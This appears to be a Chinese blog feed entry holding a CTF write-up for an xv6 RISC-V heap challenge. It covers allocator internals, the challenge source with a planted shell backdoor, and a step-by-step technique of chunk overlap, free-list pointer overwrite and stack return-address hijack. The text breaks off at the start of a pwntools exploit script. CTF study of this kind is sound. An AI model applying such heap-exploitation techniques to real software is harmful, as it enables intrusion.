class="headerlink" title="2024&#x2F;1&#x2F;1"></a>2024&#x2F;1&#x2F;1</h1><p>2023年过的太失败了，2024给我冲！！！我要变强！！！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记一道risc-v架构xv6操作系统的堆</title>
      <link href="/2023/11/18/%E8%AE%B0%E4%B8%80%E9%81%93risc-v%E6%9E%B6%E6%9E%84xv6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A0%86/"/>
      <url>/2023/11/18/%E8%AE%B0%E4%B8%80%E9%81%93risc-v%E6%9E%B6%E6%9E%84xv6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A0%86/</url>
      
        <content type="html"><![CDATA[<p>附件：<a href="https://github.com/Qanux/uheap">https://github.com/Qanux/uheap</a><br>这是一道<code>133nson</code>师兄出的题(太强啦),看了后只能说自己的见识还是太少了。<br>这一道是<code>xv6</code>系统的堆题，附件已经给出了一个完整的<code>qemu</code>环境，只要输入<code>./run.sh</code>即可启动程序<br>题目有一个<code>hint</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">This challenge is running on the xv6 system. (Attention: its heap allocator is different from GLIBC)</span><br><span class="line">You can get the xv6 source files on https://github.com/mit-pdos/xv6-riscv</span><br><span class="line">You can run this challenge locally using the command &#x27;./run.sh&#x27; and your goal is to PWN the binary chal</span><br><span class="line">To make things simple, the binary file is compiled with debug_info and I have left its source code in chal.c. This means you can use qemu and gdb-multiarch(or other debuggers) for source level debugging if necessary. (You just need to add &#x27;-S -gdb tcp::26000&#x27; to the qemu parameter in the file run.sh then you can start gdb for local debugging)</span><br><span class="line">Here are some useful gdb commands. You can write them in the file .gdbinit and start gdb with the command &#x27;gdb-multiarch -x .gdbinit&#x27;</span><br><span class="line"></span><br><span class="line">target remote:26000</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">file chal</span><br><span class="line">set disassemble-next-line on</span><br><span class="line">layout src</span><br><span class="line"></span><br><span class="line">If you have any problem about the remote environment, please contact the admin. Have fun!</span><br></pre></td></tr></table></figure><p>由于<code>elf</code>文件是附带调试信息编译的，这大大方便了我们进行动态调试</p><h3 id="如何调试"><a href="#如何调试" class="headerlink" title="如何调试"></a>如何调试</h3><p>相信很多萌新还不知道怎么进行调试，这里就进行傻瓜式教学<br>首先在<code>github</code>上面下载<code>umalloc.c</code>文件(<code>hint</code>文件上写明了)，然后将该文件放入在和<code>chal</code>同一个路径下<br>然后将<code>run.sh</code>文件中的内容进行修改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">LD_LIBRARY_PATH=./depend exec ./qemu-system-riscv64 \</span><br><span class="line">        -machine virt \</span><br><span class="line">        -bios none \</span><br><span class="line">        -kernel kernel \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -smp 3 \</span><br><span class="line">        -nographic \</span><br><span class="line">        -drive file=fs.img,if=none,format=raw,id=x0 \</span><br><span class="line">        -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0 \</span><br><span class="line">        -monitor /dev/null \</span><br><span class="line">        -S -gdb tcp::26000</span><br></pre></td></tr></table></figure><p>此时通过<code>./run.sh</code>来启动，然后再重新打开另外一个终端，进入到<code>chal</code>文件的路径下，通过<code>gdb-multiarch</code>，然后依次输入下面的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target remote:26000</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">file chal</span><br><span class="line">set disassemble-next-line on</span><br><span class="line">layout src</span><br><span class="line">b main</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>此时即可进行调试，不过我们不能向平时一样通过<code>bin</code>、<code>stack</code>这些指令来查看堆内存(其实我也不知道怎么看，请求大佬指教)，不过x<code>/16gx</code> 这一些基础的指令还是可以使用</p><h3 id="xv6堆管理分析"><a href="#xv6堆管理分析" class="headerlink" title="xv6堆管理分析"></a>xv6堆管理分析</h3><p>首先来看看<code>xv6</code>中的堆块长什么样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> Align;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">header</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">header</span> *<span class="title">ptr</span>;</span></span><br><span class="line">        uint size;</span><br><span class="line">    &#125; s;</span><br><span class="line">    Align x;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到堆块的结构和我们平时<code>glibc</code>中的不一样，他没有<code>prev_size</code>，取而代之的是堆块的指针，我们可以猜到这个指针因该和我们的<code>fd</code>指针类似(储存在<code>free</code>后的链表中的下一个<code>free</code>的堆块的堆头的位置)<br>umalloc.c(<a href="https://github.com/mit-pdos/xv6-riscv">https://github.com/mit-pdos/xv6-riscv</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/param.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Memory allocator by Kernighan and Ritchie,</span></span><br><span class="line"><span class="comment">// The C programming Language, 2nd ed.  Section 8.7.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> Align;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">header</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">header</span> *<span class="title">ptr</span>;</span></span><br><span class="line">    uint size;</span><br><span class="line">  &#125; s;</span><br><span class="line">  Align x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">header</span> <span class="title">Header</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> Header base;</span><br><span class="line"><span class="type">static</span> Header *freep;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">free</span><span class="params">(<span class="type">void</span> *ap)</span></span><br><span class="line">&#123;</span><br><span class="line">  Header *bp, *p;</span><br><span class="line"></span><br><span class="line">  bp = (Header*)ap - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(p = freep; !(bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr); p = p-&gt;s.ptr)</span><br><span class="line">    <span class="keyword">if</span>(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span>(bp + bp-&gt;s.size == p-&gt;s.ptr)&#123;</span><br><span class="line">    bp-&gt;s.size += p-&gt;s.ptr-&gt;s.size;</span><br><span class="line">    bp-&gt;s.ptr = p-&gt;s.ptr-&gt;s.ptr;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    bp-&gt;s.ptr = p-&gt;s.ptr;</span><br><span class="line">  <span class="keyword">if</span>(p + p-&gt;s.size == bp)&#123;</span><br><span class="line">    p-&gt;s.size += bp-&gt;s.size;</span><br><span class="line">    p-&gt;s.ptr = bp-&gt;s.ptr;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    p-&gt;s.ptr = bp;</span><br><span class="line">  freep = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> Header*</span><br><span class="line"><span class="title function_">morecore</span><span class="params">(uint nu)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  Header *hp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(nu &lt; <span class="number">4096</span>)</span><br><span class="line">    nu = <span class="number">4096</span>;</span><br><span class="line">  p = sbrk(nu * <span class="keyword">sizeof</span>(Header));</span><br><span class="line">  <span class="keyword">if</span>(p == (<span class="type">char</span>*)<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  hp = (Header*)p;</span><br><span class="line">  hp-&gt;s.size = nu;</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)(hp + <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> freep;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>*</span><br><span class="line"><span class="title function_">malloc</span><span class="params">(uint nbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  Header *p, *prevp;</span><br><span class="line">  uint nunits;</span><br><span class="line"></span><br><span class="line">  nunits = (nbytes + <span class="keyword">sizeof</span>(Header) - <span class="number">1</span>)/<span class="keyword">sizeof</span>(Header) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>((prevp = freep) == <span class="number">0</span>)&#123;</span><br><span class="line">    base.s.ptr = freep = prevp = &amp;base;</span><br><span class="line">    base.s.size = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(p = prevp-&gt;s.ptr; ; prevp = p, p = p-&gt;s.ptr)&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;s.size &gt;= nunits)&#123;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;s.size == nunits)</span><br><span class="line">        prevp-&gt;s.ptr = p-&gt;s.ptr;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        p-&gt;s.size -= nunits;</span><br><span class="line">        p += p-&gt;s.size;</span><br><span class="line">        p-&gt;s.size = nunits;</span><br><span class="line">      &#125;</span><br><span class="line">      freep = prevp;</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">void</span>*)(p + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p == freep)</span><br><span class="line">      <span class="keyword">if</span>((p = morecore(nunits)) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们侧重看一下堆块大小的计算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nunits = (nbytes + <span class="keyword">sizeof</span>(Header) - <span class="number">1</span>)/<span class="keyword">sizeof</span>(Header) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>大概就是原本的堆块大小减一加上一个堆头结构的大小后除以堆头的大小再向上取整（比如申请<code>0x19</code>大小的堆块计算出的<code>size</code>为<code>3</code>，申请<code>0x30</code>的堆块计算出的<code>size</code>为<code>4</code>）</p><h4 id="malloc函数"><a href="#malloc函数" class="headerlink" title="malloc函数"></a>malloc函数</h4><p>在<code>malloc</code>函数中，先根据申请的堆块计算出相应的堆块大小，若<code>free</code>链表的表头为<code>0</code>（<code>free</code>链表尚未初始化，则会将静态全局变量<code>base</code>的地址赋值给<code>free</code>的表头指针<code>freep</code>）。然后会从<code>prevp-&gt;s.ptr</code>（表头后的第一个堆块指针）开始顺着<code>s.ptr</code>遍历<code>free</code>链表，若遇到比待申请的堆块大小大的堆块，则会直接切分该堆块，将前一部分返回，后一部分留在链表内；若遇到<code>size</code>刚好符合需求的，则将其脱链后直接返回；若遍历完整个链表仍未遇到可以进行分配的<code>free</code>堆块，则会调用<code>morecore</code>函数向系统申请更多的内存。</p><h4 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h4><p>在<code>free</code>函数中，会先遍历<code>free</code>链表，若途中遇到待释放的堆块地址处于链表中的两个<code>free</code>堆块之间的话，则会提前退出，否则等待链表被遍历完一轮之后退出（实际上该链表为一个单向循环链表）。然后检查该堆块是否有前&#x2F;后向相邻的<code>free</code>堆块，若有则进行前&#x2F;后向合并，若无则将其直接插入到<code>free</code>链表中。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>查看保护机制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">or4nge@圈圈:/mnt/d/desktop/uheap$ checksec chal</span><br><span class="line">[!] Did not find any GOT entries</span><br><span class="line">[*] &#x27;/mnt/d/desktop/uheap/chal&#x27;</span><br><span class="line">    Arch:     riscv64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>只开启的<code>NX enabled</code>(<code>133nson</code>：“送分题”)<br>出题人比较友好，直接给出了题目源码<br>chal.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *arr[<span class="number">4</span>];</span><br><span class="line"><span class="type">void</span> *record;</span><br><span class="line"><span class="type">int</span> chance = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">banner</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;         __\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  __  __/ /_  ___  ____ _____\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; / / / / __ \\/ _ \\/ __ `/ __ \\\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;/ /_/ / / / /  __/ /_/ / /_/ /\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\\__,_/_/ /_/\\___/\\__,_/ .___/\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;                     /_/\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1. add\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2. delete\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3. ???\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">readline</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">read(<span class="number">1</span>, &amp;buf[i], <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(buf[i] == <span class="string">&#x27;\x0a&#x27;</span>)&#123;</span><br><span class="line">buf[i] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="keyword">if</span> (size &lt; <span class="number">0</span> || size &gt; <span class="number">0x50</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="keyword">for</span> (idx = <span class="number">0</span>; idx &lt; <span class="number">4</span>; idx++)</span><br><span class="line"><span class="keyword">if</span> (arr[idx] == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (idx == <span class="number">4</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">arr[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">readline(arr[idx], size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt; <span class="number">4</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[idx]) &#123;</span><br><span class="line"><span class="built_in">free</span>(arr[idx]);</span><br><span class="line"><span class="keyword">if</span> (chance)</span><br><span class="line">record = arr[idx];</span><br><span class="line">arr[idx] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> *argv[] = &#123;<span class="string">&quot;sh&quot;</span>, <span class="number">0</span>&#125;;</span><br><span class="line">exec(<span class="string">&quot;sh&quot;</span>, argv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (chance) &#123;</span><br><span class="line"><span class="keyword">if</span> (record)</span><br><span class="line"><span class="built_in">free</span>(record);</span><br><span class="line">record = <span class="number">0</span>;</span><br><span class="line">chance = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">banner();</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> choice;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"><span class="keyword">switch</span> (choice) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">add();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">delete();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">gift();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目给出的<code>backdoor</code>，而且<code>gitf</code>函数则是直接送了一次<code>double free</code><br>但是我们不能直接<code>double free</code>，主要有两个原因：</p><ul><li>观察到<code>free</code>函数前面会有一个循环遍历</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(p = freep; !(bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr); p = p-&gt;s.ptr)</span><br><span class="line">  <span class="keyword">if</span>(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>如果直接<code>double free</code>会直接在这里进入死循环</p><ul><li><code>ptr</code>指针在<code>heap</code>的头部前<code>8</code>个字节，直接<code>double free</code>并不能对起做任何修改</li></ul><p>所以可以选择叠堆后造成堆溢出才有机会修改<code>ptr</code>指针</p><p>因为这里的堆块合并条件非常简单，所以造堆叠也很简单，先<code>free</code>两个相邻的堆块让他们合并（下文称这两个堆块中低地址的堆块为<code>a</code>，高地址的为<code>b</code>），合并后表头<code>freep</code>变为刚刚释放的<code>a</code>，然后<code>double free</code>堆块<code>b</code>，这个时候因为表头是<code>a</code>，所以第一次循环就满足 <code>if(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</code> 的条件退出循环，这时又因为<code>b</code>与之前<code>a</code>不相邻（合并后堆块<code>a</code>的<code>size</code>已被修改为合并后的大小），所以不会触发合并，而是将<code>b</code>直接链入链表。现在只需要将<code>a</code>申请出来，就可以堆叠到<code>b</code>进行非法写入修改<code>free</code>链表上堆块<code>b</code>的<code>s.ptr</code>。因为之前合并的时候<code>freep</code>被赋值为了堆块<code>a</code>，而<code>malloc</code>遍历是从<code>freep-&gt;s.ptr</code>开始遍历的，为了简化利用模型，可以再<code>free</code>一个低于以上两个且不相邻的堆块来更新<code>freep</code>，将<code>freep-&gt;s.ptr</code>变成堆块<code>a</code>，然后下次<code>malloc</code>的时候就会从<code>a</code>开始遍历。这时申请出<code>size</code>为<code>a+b</code>堆块就可以把之前的<code>a</code>申请出来，利用堆叠写<code>b-&gt;s.ptr</code>为目标地址<code>addr</code>，再连续分配两次（先要把<code>b</code>给申请出来），<code>malloc</code>就会尝试将<code>addr</code>分配出去，这时如果<code>addr</code>合法（地址合法且<code>size</code>符合要求）就会返回<code>addr</code>，到这一步就完成了容易地址分配<br>至于分配到哪，因为程序是静态链接的，没<code>got</code>表可打，没动态库中的<code>hook</code>和<code>glibc</code>中的经典<code>io</code>可打，也没什么现成的函数指针可以利用。所以考虑分配到栈上劫持返回地址到后门，因为系统没有<code>ASLR</code>功能（其实出题人出到一半看到了一篇<code>xv6</code>实现<code>ASLR</code>功能的论文，但因为时间比较仓促所以没有把<code>ASLR</code>加上了，也算是变相降低了难度吧），可以通过调试找到固定的栈帧地址来劫持<code>add</code>函数的返回地址。最后就是因为<code>malloc</code>函数中要<code>size</code>满足要求才能将目标地址<code>addr</code>分配出去，所以这里可以考虑利用<code>add</code>函数的局部栈上变量<code>size</code>和<code>idx</code>来构造合法的<code>size</code>将<code>addr</code>分配出去，这里用的是<code>idx</code>（<code>idx</code>最后为<code>3</code>，可以通过 <code>malloc(0x20)</code> 分配）</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;3. ???\n&#x27;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span 